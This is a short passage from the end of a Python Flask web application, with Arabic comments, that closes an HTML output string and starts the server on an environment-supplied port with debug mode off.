    output += "</body></html>"
    return output

# ========== تشغيل الخادم ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
